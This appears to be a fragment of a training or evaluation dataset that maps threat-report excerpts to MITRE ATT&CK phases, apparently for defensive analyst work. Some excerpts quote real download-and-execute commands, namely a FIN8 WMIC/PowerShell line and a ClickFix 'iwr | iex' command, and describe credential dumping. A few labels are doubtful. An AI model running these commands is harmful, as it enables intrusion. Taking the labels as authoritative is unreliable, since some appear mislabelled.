        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This is the second part of a two-part blog post for understanding Angler exploit kit (EK). Thefirst partcovered EKs in general. This blog focuses on the Angler EK.\nAngler is currently one of the most advanced, effective, and popular exploit kits in the cyber criminal market. It generally uses the most recent exploits based on the latest vulnerabilities. Like most leading EKs, the authors behind Angler use Software as a Service (SaaS) as their business model, and Angler can be rented in the cyber underground fora few thousand dollars a month.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Ever since the disclosure of theFollina vulnerability (CVE-2022-30190)earlier this year, threat actors have been known to leverage the flaw in various phishing campaigns. Delivery of this intrusion waslinkedto TA570, using hijacked email threads to deliver the initial payload. This intrusion started after a Word document, weaponized with Follina exploit code, was used to deliver and infect the host with Qbot malware.\nWhen dealing with a Word document based on the OOXML format, associated files and folders are stored within a compressed ZIP archive. These items can be easily extracted by using an arbitrary zip utility likeunzip. One of the embedded files that requires inspection during the analysis of a Follina maldoc, is nameddocument.xml.rels\nThis \"relationship\" (RELS) file contained an external reference to a remote HTML file, configured to be retrieved and loaded when the Word document is opened, or viewed in Preview Mode.\nAt the bottom of the retrieved HTML page source, the script tag was defined and contained malicious JavaScript code that called thems-msdtscheme.\nWhen a system is vulnerable to Follina (CVE-2022-30190), the code will be interpreted and executed bymsdt.exe(Microsoft Support Diagnostic Tool). A good detection opportunity is to monitor for this process being spawned by a Microsoft Office application such asWINWORD.EXE\nIn our case, the payload contained base64-encoded PowerShell code. The decoded payload is also logged in EventID 4104 (script block logging) upon execution by the PowerShell engine.\nThe Follina payload was designed to download Qbot libraries from three different URLs, drop the files inside the user's temp directory, and finally execute the DLLs usingregsvr32.exe",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Tor2Mine was used to access the LSASS memory space and the access granted was 0x1010.\nOn the beachhead, we observed the execution of credential dumping utilityInvoke-PowerDump.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Emotet began its life as a banking trojan, but over the years, it evolved into what can now be classified as a highly modular threat that adversaries leverage for a variety of purposes. In recent years, it has often been used as a \"beachhead\" in victim networks as it provides initial access and long-term persistence that malicious adversaries can use to conduct further intrusion activities from within infected networks. In many cases, it is used as the initial payload in a multi-stage infection process and can be operational in victim networks for extended periods of time before adversaries choose to leverage the access it provides to further attack organization. This is an important consideration for network defenders as system backups may be compromised as a result of long-term infections that reside in systems in the environment. \nThere are several other malware families that are also often delivered alongside Emotet such as Trickbot, Qakbot and others. Many network-based ransomware incidents, such as those conducted by the operators of Ryuk ransomware, can be traced back to initial network access gained via Emotet. Over the past few years, Emotet has periodically taken breaks from sending spam messages, with periods of inactivity ranging from weeks to months in several cases. It is important to note that while these periods of inactivity correspond to lack of spam distribution, the botnets are typically still operational during these periods and as such, previously infected systems can still be leveraged for intrusions. \nOrganizations and network defenders should be aware of the threat posed by Emotet and ensure that they have strategies in place to prevent compromise, detect infections within their environments, and ensure that their backup and recovery strategies compensate for situations in which the malware may have been resident for extended periods prior to discovery. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: 19 DEC 2017 minute read \nAt the end of September, Palo Alto released a report on Unit42 activity where they \u2013 among other things \u2013 talked about PYLOT malware. We have been detecting attacks that have employed the use of this backdoor since at least 2015 and refer to it as Travle. Coincidentally, KL was recently involved in an investigation of a successful attack where Travle was detected, during which we conducted a deep analysis of this malware. So, with this intelligence ready we are sharing our findings in this blog to supplement Palo Alto's research with additional details. ",
        "output": "other",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In cases where the process compromised via web shell does not have local administrator privileges, Flax Typhoon downloads and runs a piece of malware that exploits one or more known vulnerabilities to obtain local system privileges. Microsoft has observed the actor use Juicy Potato, BadPotato, and other opensource tools to exploit these vulnerabilities. ",
        "output": "privilege escalation",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Given the urgency surrounding Log4Shell, users may have deployed hot patches at scale, inadvertently putting container environments at risk. Even after Java applications were patched against Log4Shell, users may have kept the hot patch running for defense-in-depth as there isn't a strong incentive to remove it.\nContainers are often used as a security boundary between applications running on the same machine. A container escape allows an attacker to extend a campaign beyond a single application and compromise neighboring services. In Kubernetes clusters, a single container escape is unfortunately sometimes enough to take over the entire cluster.\nThe issues are exploitable regardless of the container configuration, so even environments that enable advanced isolation techniques like running containers inuser namespacesor as a non-root user are affected.\nAside from containers, unprivileged processes could have also exploited the vulnerabilities to escalate privileges and gain full control over their underlying server.",
        "output": "impact",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1005 Data from Local System   \nT1039 Data from Network Shared Drive   \nT1074 Data Staged   \nT1074.001 Local Data Staging   \nT1114 Email Collection   \nT1114.001 Local Email Collection   \nT1115 Clipboard Data   \nT1119 Automated Collection   \nT1213 Data from Information Repositories   \nO T1213.002 Sharepoint   \nO T1213.003 Code Repositories \nT1602 Data from Configuration Repository T1602.002 Network Device Configuration Dump ",
        "output": "collection",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: By Nick Biasini, Edmund Brumaghin \nTHURSDAY, FEBRUARY 13, 2020 14:07 \nTHREAT SPOTLIGHT\nCoronavirus is dominating the news and threat actors are taking advantage. Cisco Talos has found multiple malware families being distributed with Coronavirus lures and themes. This includes emotet and several RAT variants. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As mentioned above, most APT41 attacks were conducted using Cobalt Strike. \nApplication Layer Protocol: Web Protocols  T1071.001 \nThe group used HTTP and HTTPS listeners to communicate with C&C servers. \nApplication Layer Protocol: DNS  T1071.004 \nTo hide all communication with C&C servers, the threat actors also used DNS tunnels. \nIngress Tool Transfer  T1105 \nThe threat actors used Cobalt Strike to upload their files to compromised devices. For certain targeted organizations, the group uploaded files from special directories named after the compromised organization. \nupload C:\\Users\\Administrator\\Desktop\\cs\\dns\\COMSysUpdate.ocx upload   \nC:\\Users\\Administrator\\Desktop\\webshell\\uploada4.aspx upload   \nc:\\users\\alex\\desktop\\smb.exe upload   \nC:\\Users\\Administrator\\Desktop\\cs\\SecurityHealthSystray.dll upload   \nC:\\Users\\Administrator\\Desktop\\cs\\install.bat upload   \nC:\\Users\\jack\\Desktop\\tmp\\cs_shell\\server\\install.bat upload   \nC:\\Users\\jack\\Desktop\\tmp\\cs_shell\\server\\bthsvc64.dll upload   \nC:\\Users\\jack\\Desktop\\tmp\\procdump64.exe upload C:\\Users\\jack\\Desktop\\   \n{redacted}\\244\\mciwave32.dll upload C:\\Users\\Admin\\Desktop\\   \n{redacted}\\HTTPS\\LxpSvc.exe upload C:\\Users\\Admin\\Desktop\\Webshell upload   \nC:\\Users\\Admin\\Desktop\\{redacted}\\webshell\\test4.aspx upload C:\\Users\\Admin\\Desktop\\ \nProxy: Internal Proxy  T1090.001 \nIn the attacks we analyzed, APT41 often used a tool for proxying traffic called FRPC. \nfrcp.exe -c frcp.ini ",
        "output": "command and control",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: For C2 communication, some of the LuminousMoth samples contacted IP addresses directly, whereas others communicated with the domain \"updatecatalogs.com\". \n103.15.28[.]195   \n202.59.10[.]253 \nInfrastructure ties from those C2 servers helped reveal additional domains related to this attack that impersonate known news outlets in Myanmar, such as MMTimes, 7Day News and The Irrawaddy. \nAnother domain \"mopfi-ferd[.]com\" also impersonated the Foreign Economic Relations Department (FERD) of the Ministry of Planning, Finance and Industry (MOPFI) in Myanmar. \nmmtimes[.]net mmtimes[.]org 7daydai1y[.]com irrawddy[.]com mopfi-ferd[.]com \n\"Mopfi-ferd[.]com\" resolved to an IP address that was associated with a domain masquerading as the Zoom API. Since we have seen the attackers deploying a fake Zoom application, it is possible this lookalike domain was used to hide malicious Zoom traffic, although we have no evidence of this. ",
        "output": "command and control",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attack campaign starts with an email, shown in Figure 2. It implies that the inquiry email is from a customer and urges the recipient to open the attachment. This typical phishing email tactic uses job-related information and urgent language to deceive recipients into opening attachments or clicking links.\nThe attachment is an HTML file that uses the \"search-ms\" functionality to query the \"e_Statement\" LNK file on remote file shares, as shown in Figure 3. Once the user opens the HTML file and clicks on \"Open\" to allow Windows Explorer to open, the malicious LNK file is shown in Windows Explorer and lures the user into executing it using a PDF icon.\nThe LNK file contains a command to run a remote batch file using conhost.exe as the parent process. The attacker attempts to leverage the built-in Windows binary 'conhost.exe' for indirect execution to evade detection, as shown in Figure 4.",
        "output": "initial access",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: XMRig was running on the system, using some CPU but not enough to cause any issues. We tend to block mining endpoints, which may have lessened the impact of this intrusion. XMRig made connection attempts to 104.140.201[.]42 & 104.142.244[.]186.\nThe threat actors have been using the associated Monero wallet for 738+ days and have netted around $5,159.\nWas the threat actors' mission to mine Monero? Or was this a recon mission? Possibly both?\nEnjoy our report? Please consider donating $1 or more to the project usingPatreon. Thank you for your support!\nWe also have pcaps, files, and Kape packages availablehere. No memory captures are available for this case.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After their initial reconnaissance, the malicious actors spread across the network expanding their foothold by, primarily, targeting domain controllers. They engaged in lateral movement by using the WMIC utility for remote code execution (a built-in Windows tool). \nwmic.exe /node:<target> process call create \"cmd /c powershell.exe -nop -ep bypass -c \\$pw='b640a9c0e64704e1e202a07774613a29971fe5aa';\\$pa='sys';iex (NewObject System.Net.WebClient).DownloadString('https://104-168-237- 21.sslip[.]io/134af6')\" \nWMIC (wmic.exe) was used to create a remote command prompt instance (cmd.exe), which then executed the PowerShell code. The PowerShell command created two variables and attempted to download and execute the payload from one of FIN8's Command and Control (C&C) servers. This download was blocked by Bitdefender  below description is based on interpretation of variables discovered in our previous analysis of FIN8 operations. \n\\$pw  Probably password to decrypt the downloaded script file. Because download was blocked, we couldn't analyze the script. \n\\$pa  Instructions for malicious framework to impersonate the lsass.exe/vmtoolsd.exe token and inject itself into a new \"svchost.exe -k netsvcs\" process. \nFinally, command line tried to execute (iex is an alias for Invoke-Expression) the code downloaded from the IP address 104[.]168[.]237[.]21. Threat actors abused sslip.io for connection to C&C - a service that provides free IP to domain mapping to make SSL certificate generation easier for traffic encryption. While this service is legitimate and widely used, the malware abused it in an attempt at evading detection when connecting to C&C servers. \nFor one of the machines, a slightly different URL was observed (ending with /edaea0) with the identical $\\$pw$ and $\\$p a$ variables. The scripts downloaded from sslip.io were unavailable at the time of this analysis as the server was down. \nThis attempt was blocked by Bitdefender's command line scanning capability. To avoid the command line scanning, attackers then switched the attack tool to wmiexec.py from Impacket (a collection of Python classes to work with low-level access to packets and network protocols). This Python script connected directly to the target machine (without installing any service/agent on the target machine) and used the valid credentials to execute the code. \nNOTE: As a result of using wmiexec.py, the command lines we noticed on affected machines have specific output redirection such as \\ 1> \\\\127.0.0.1\\ADMIN\\$\\__1621898828.3311949 2>&1. \nAs is often the case with sophisticated adversaries, the attackers tried different methods to bypass the deployed security controls. Via trial and error, they were eventually able to take over some of the servers. One script used by the malicious actors, C:\\Windows\\Temp\\rdp.ps1,was unavailable at the time of this analysis, and we believe it was an attempt to use RDP tunneling (FIN8 has been known to use Plink for RDP tunneling). ",
        "output": "lateral movement",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Environment Discovery\nAs previously mentioned, we saw multiple cmdlets related to exchange:\nUsing the dropped web shells, the threat actors performed the following commands:\nPort Scanning\nThe threat actors used KPortScan 3.0, a widely used port scanning tool on Hacking Forums, to perform network scanning on the internal network:",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: RDP connections were initiated from Cobalt Strike Beacons running on the beachhead host to two domain controllers and then Cobalt Strike executables were dropped by these connections.\nIn addition to using RDP to move around the environment execuatables were also transferred over SMB to ADMIN$ shares and executed as a service.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: C2\nhao771[.]sharepoint.com\nFiles\n51796effe230d9eca8ec33eb17de9c27e9e96ab52e788e3a9965528be2902330989f58c86343704f143c0d9e16893fad98843b932740b113e8b2f8376859d2ddA5210aaa9eb51e866d9c2ef17f55c0526732eacb1a412b910394b6b51246b7dacc151456cf7df7ff43113e5f82c4ce89434ab40e68cd6fb362e4ae4f70ce65b3",
        "output": "other",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Day 1\nAdFind and adf.bat were dropped and run minutes after Document-Preview.exe was executed. We've seen adf.bat numerous times and you can read more about ithere. The batch file outputs information into the following text files.\nNltest was used to check for Domain trusts\nNet was used to show Domain Admins\nPing was used to test if systems were up in the environment\nBreak down of the process tree of activity from the Bazar loader on day 1.\nDay 2\nAfind was run again, and then the threat actor attempted toKerberoastusingRubeus.\nAfter a few false starts during lateral movement failures, the threat actors performed some additional local system recon.\nWMI was used to check for the current AntiVirus on numerous systems",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Remote Service\nThe main method used by the threat actor to move laterally was by using the jump psexec_psh feature of Cobalt Strike. By using this technique, they installed Cobalt Strike on multiple hosts in rapid succession via PowerShell and base64 encoded payload.\nBy using Zeek, we can observe all the calls done over RPC to create and execute this service.\nCyb3rSn0rlaxhave created areally good resource on how to detect these kinds of techniques\nLeveraging Cyberchef, the recipedescribed in our earlier report, we can decode the shellcode.\nRDP\nUsing the proxy capability inside QDoor, they used RDP to access a file server and domain controller. This could be observed in the event ID 4624 LogonType 10 logs:\nSince QDoor's C2 communication is unencrypted it's possible to spot this behavior with Suricata.\nWhile performing these RDP actions the threat actor leaked their back end hostname via various log events:\nevent ID 4779:\nevent ID 4624 LogonType 3:",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In this example, we will be using the Windows system utility Dism.exe discovered in the Windows System Utilities section as our executable, along with a DLL generated by DueDLLigence in conjunction with SharPersist to establish persistence on a target system. First, the DISM system utility and malicious DLL are uploaded to the target system as shown in Figure 15. \nThen we use SharPersist to add startup folder persistence, which uses our DISM system utility and associated DLL as shown in Figure 16. \nAfter the target machine has been rebooted and the targeted user has logged on, Figure 17 shows our Cobalt Strike C2 server receiving a beacon callback from our startup folder persistence where we are living in the Dism.exe process. ",
        "output": "persistence",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ZLoader has used various methods of defense evasion, focused on attempting to appear more legitimate or by disabling security tools. In multiple campaigns associated with malicious ads, the ZLoader operators would sign malicious files used in their attack chain. Signing these files is intended to make them appear to be legitimate, non-malicious files used by real software, rather than malicious files used by malware. \nThe first method ZLoader has used to sign files is by creating fictitious companies. In certain campaigns, the .msi files that are installed on the device after the user visits a malicious ad are signed by a fictitious company created by the operator for the purpose of the campaign. The malware operators created multiple fraudulent companies, such as Flyintellect Inc, and Datalyst Oy, in several campaigns. Due to the way .msi files are designed, the registry keys that are added by this activity later in the attack chain are also published by the same company name. \nAnother method operators have used to evade detection is a set of techniques that utilize validly-signed files to hide malicious scripts through vulnerabilities like CVE2020-1599, CVE-2013-3900, and CVE-2012-0151. \nZLoader operators have also attempted to perform defense evasion by disabling security tools. In many instances, ZLoader will drop a file, frequently a .bat file, that then uses PowerShell to turn off and alter security settings, such as excluding all .dll and .exe files and regsvr32.exe from being scanned. ",
        "output": "defense evasion",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: While the threat actors were active in the environment, we received 3 different alerts stating that someone had opened canary documents from the IP address 91.193.182[.]165. These alerts tell us that data was indeed exfiltrated from the environment.\nThe threat actors were most interested in files concerning financial statements, ransomware reports, and salary data.\nThe C2 channel was encrypted and multiple connections were established with the internal file server. No other traffic was observed for possible exfiltration leading us to the conclusion that the command and control channel was used for the exfiltration.\nAt 17:35 UTC, the Cobalt Strike Beacon was deployed on the File Server.\nAccording to the number of connections to the C2 from the File Server per minute, we can conclude that exfiltration was done between 17:52 UTC and 18:00 UTC.\nSpike in traffic from file share server to Cobalt Strike command and control server.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA observed no evidence of direct privilege escalation. The threat actor attained domain administrator credentials on the NetScaler device via exploit and continued to expand credential access on the network. ",
        "output": "privilege escalation",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Qbot uses a tiered infrastructure, often using other compromised systems as first tier proxy points for establishing a constantly changing list of C2 endpoints. You can review a in-depth analysis of the modules of this malware in thisCheckpoint report.\nWith this type of setup the list of C2 from October 2021, has in large rotated out of use. To keep up to date on current Qbot C2 endpoints you can check out ourThreat Feed & All Intel serviceas we track these changing lists daily.\nQbot does use SSL in it's C2 communication but does not rely soley on port 443 for communication, in the case investigated here the following ports were found in the extractedC2 configuration.\nQbot uses SSL and while the domains do not resolve, they follow a pattern and are detectable with several Suricata ETPRO signatures.\nQbot JA3/S:",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors employed a couple different credential access techniques. The first technique used was dumping passwords from lsass on the beachhead machine.\nAfter they gained access to a domain controller, we witnessed them use ntdsutil to run the following command:\nThe above command was executed from a batch file that was dropped and then executed using wmic.\nThis command, which is included inDPAT,dumps NTDS.dit to disk and has been used by Trickbot actors in the past. The above technique has been around since at least 2014@chriscampell.\nEvent ID 2001, 2003, 102, 300, 301, 302, and 103 were all seen in response to the above command as well as a file create by lsass.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the RDP session on the backup server, the threat actor opened powershell_ise.exe and ran the script Veeam-Get-Creds.ps1 (https://github.com/sadshade/veeam-creds/blob/main/Veeam-Get-Creds.ps1).\nThe PowerShell operational log with event ID 4103 and 4104 tracked the output of the script which highlighted they successfully extracted an Administrator password from the Veeam database.\nThe LSASS process on the backup server was accessed via the RunDll32 (Cobalt Strike) beacon using a well known Granted Access pattern of 0x1010  PROCESS_QUERY_LIMITED_INFORMATION (0x1000) & PROCESS_VM_READ (0x0010)\nThe RunDll32 process was also observed interacting with other processes such as cmd.exe and RunDll32.exe, using SYSTEM, a compromised account domain administrator account and a newly created local account.\nSystem Recovery\nThe use of the Microsoft utility VSSADMIN (Volume Shadow Copy Service) was observed on the beachhead host for listing the configured shadows and then creating a new shadow. It appears that the threat actor had trouble executing the command and repeated the attempt again with an extra 'cmd' invocation.\nWe never observed any interaction with the created shadow copy. It's unclear why the threat actor initiated this command. A hypothesis to why a shadow volume would be created, would be to extract credentials via local saved stores (SAM hives for example as this was not a Domain Controller).\nThere is a an identical 'vssadmin' command detailed on various Red Team tutorials (https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-domain-controller-hashes-via-wmic-and-shadow-copy-using-vssadmin)",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Based on the activity seen, we assess that the likely final actions would have been ransomware deployment across the domain environment.\nBased on research from late last year byKyle Ehmke, we can assess that the likely ransom deployment would have been Ryuk (Wizard Spider / UNC1878).\nEnjoy our report? Please consider donating $1 or more to the project usingPatreon. Thank you for your support!\nWe also have pcaps, files, and Kape packages availablehere. No memory captures are available for this case.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attack campaign starts with a phishing email containing an HTML file as an attachment, as illustrated in Figure 2. It uses a brief explanation and an urgent tone to prompt the recipient to open the attachment immediately.\nThe attachment, \"Documents.html,\" is a ClickFix attack that embeds a fake error message and instructions in HTML to deceive users into copying and pasting a malicious PowerShell command into their terminal or PowerShell, ultimately executing malicious code.\nDecoding the base64-encoded string shown in Figure 3 reveals a PowerShell command that downloads and executes a remote PowerShell script.\npowershell -w h -c \"iwr 'hxxps://hao771[.]sharepoint.com/_layouts/15/download.aspx?share=EU7smZuKo-pDixZ26BSAaX0BVVcF5VkOc7qEvjsDSAH9OQ'|iex\"",
        "output": "initial access",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Current builds of Ryuk no longer contain persistence functionality. Previously, to remain persistent on the host, Ryuk created a registry entry under the Run key using Windows cmd.exe shell. The following command line was used to write to the Registry Run Key name svchos to \nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\Curren tVersion\\Run with the value being the path to the Ryuk executable. ",
        "output": "persistence",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Emotet malware infection on the beachhead host used a registry run key to maintain persistence.\nThis registry key activity (Sysmon EventID 12 & 13) was observed continuously on the beachhead host for the first few days of the intrusion.\nBeyond the beachhead host, the threat actor deployed several Atera/Splashtop remote access tools across the environment as an alternative means of access to the environment should they lose access to their Cobalt Strike beacons.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: By Martin Lee \nTHURSDAY, AUGUST 2, 2018 08:48\nAuthored by Aleksandar Nikolic. \nExecutive summary \nIt can be very time-consuming to determine if a bug is exploitable or not. In this post, we'll show how to decide if a vulnerability is exploitable by tracing back along the path of execution that led to a crash. In this case, we are using the Tetrane REVEN reverse-engineering platform, which allows us to identify the exploitability of the bug quickly. \nProbing for software vulnerabilities through fuzzing tends to lead to the identification of many NULL-pointer dereference crashes. Fuzzing involves taking various permutations of data and feeding those permutations to a target program until one of those permutations reveals a vulnerability. The kinds of software bugs we reveal with fuzzing may be denial-of-service vulnerabilities that aren't particularly critical and simply cause the software under test to crash. However, they could also be evidence of an arbitrary code execution vulnerability where the NULL pointer can be controlled, leading to the execution of code supplied by an attacker. Below, we will sort through all of this and determine whether a particular flaw is exploitable or not. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Affected platforms:WindowsImpacted parties:Windows UsersImpact:Potential to deploy additional malware for additional purposesSeverity level:Medium\nIn early February of 2022,Microsoft announcedthat Internet Macros would be blocked by default to improve the security of Microsoft Office.According to their blogpublished in late Feb 2023, this change began rolling out in some update channels in April 2022. Other channels followed in July and October 2022, with the final rollout in January 2023.\nOffice uses a specific algorithm to determine whether to run macros in files from the Internet. The process starts by checking the file attribute. If it has a Mark of the Web (MOTW) attribute, it verifies whether it is from a trusted location and performs other processes, and based on those outcomes, it decides whether to block or run the macro.\nSince that announcement, we have observed that cyber threat actors have begun to test and adopt new infection vectors to replace Office macros. Several methods include using .hta, .lnk, and .chm files, targeting Office vulnerabilities (Equation Editor and Follina are the most common), and we have seen the use of xll files over the past year by cyber threat actors to distribute their malicious payloads.\nThe most common method employed by several cybercrime and nation-state actors is using ISO image files that usually contain a .lnk file and a dll payload to distribute their malware. In this method, the victim must execute the .lnk file, which leads to executing the dll file \u2013 commonly either a malicious payload or a downloader that grabs the next-stage payload. These ISO images are either directly attached to a spam/phishing email or have been dropped using other methods, like html smuggling, in which an html file is attached to the spam/phishing email, and by opening it, a malicious ISO file is dropped in the victim's machine. We covered these techniques in blogs last year,hereandhere.\nEven though several cyber threat actors have adopted TTPs to not use Office macros, we have observed several threat actors still relying on Office macros to initiate their attacks. In this blog post, we provide an overview of some of the interesting Office macro-embedded documents we observed early this year (some of these activities have already been reported on by security researchers on Twitter). It is worth mentioning that while some of the threat actors had multiple activities, we only cover one of them as an example in the post. But we added all the related IOCs in the IOC (Indicator of Compromise) section at the end of this blog.",
        "output": "other",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Three files were downloaded by Hancitor from 4a5ikol[.]ru (8.211.241.0) including two Cobalt Strike stagers and Ficker Stealer.\nHancitor then launched multiple instances of svchost.exe and process injected them with Cobalt Strike.\nThe following diagram shows the initial execution process from the WINWORD.exe to the Cobalt Strike Beacons that were injected into memory by Hancitor.\nLastly, a Cobalt Strike command and control server was pinged before they copied the Cobalt Strike DLL and batch file, which were used to facilitate lateral movement.\nThe batch file (cor.bat) is a 3-line script that will execute the Cobalt Strike DLL using rundll32.exe with a specific parameter.\nThe Cobalt Strike DLL used in this case resembles the same Cobalt Strike DLL seen incase 4301based on the YARA rule associated to that case, indicating likely links between the actors in the two cases.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ATT&CK Technique : Create Account: Local Account (T1136.001) \nATT&CK Technique : Account Manipulation: Device Registration (T1098.005) ",
        "output": "persistence",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Analyst's comment: These indicators should not be considered exhaustive for this observed activity. Moreover, aside from the malicious DLLs, Microsoft researchers have observed two files in October 2019 with code anomalies when a class was added to the SolarWinds DLL. Note however that these two do not have active malicious code or methods. ",
        "output": "command and control",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: BumbleBee\nMeterpreter\nCobalt Strike\nThis C2 server was observed in a previousBumbleBee case.\nAnyDesk\nAnyDesk was installed to facilitate interactive desktop command and control access to a server in the environment.\nReviewing thead_svc.trace logsfrom Anydesk located in %programdata%\\AnyDesk reveal the logins originating from 108.177.235.25. This was again the same IP observered in the priorBumblebee case.\nThe Client-ID observed in the logs was 892647610",
        "output": "command and control",
